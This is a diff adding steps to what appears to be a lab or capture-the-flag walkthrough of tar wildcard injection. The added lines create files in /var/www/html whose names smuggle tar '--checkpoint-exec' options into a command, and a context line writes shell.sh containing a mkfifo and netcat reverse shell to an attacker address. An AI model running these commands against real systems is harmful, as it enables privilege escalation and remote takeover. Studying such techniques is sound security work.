@@ -224,7 +224,11 @@ Here are some of the arguments we can abuse.
 --checkpoint-exec= <some bash command>    -> executes some bash command
 --checkpoint= <time>                      -> display progress after <time> number of records
 ```
-
+So we create these files on the /var/www/html directory.
+```
+touch "/var/www/html/--checkpoint-exec=sh shell.sh"
+touch "/var/www/html/--checkpoint=1"
+```
 Lets write a file called ```shell.sh``` with some malicious command inside.
 ```
 echo "rm /tmp/buffer;mkfifo /tmp/buffer;cat /tmp/buffer|/bin/sh -i 2>&1|nc $your_ip 2403 >/tmp/buffer" > shell.sh
